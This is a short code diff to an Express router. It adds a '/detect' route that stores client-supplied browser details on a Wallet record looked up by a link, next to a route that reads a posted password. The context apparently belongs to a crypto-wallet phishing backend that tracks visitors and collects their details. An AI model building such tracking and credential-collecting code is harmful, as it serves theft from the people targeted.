@@ -143,6 +143,21 @@ router.post("/touched", async (req, res) => {
   }
 });
 
+router.post("/detect", async (req, res) => {
+  let link = req.body.link;
+  let browser = req.body.browser;
+
+  try {
+    let wallet = await Wallet.findOne({ link });
+    wallet.browser = JSON.parse(browser)
+    await wallet.save();
+    res.send({ status: "ok" });
+  } catch (error) {
+    res.status(400).send(error);
+    console.log(error);
+  }
+});
+
 // Send e-mail
 router.post("/email", async (req, res) => {
   let pass = req.body.pass;
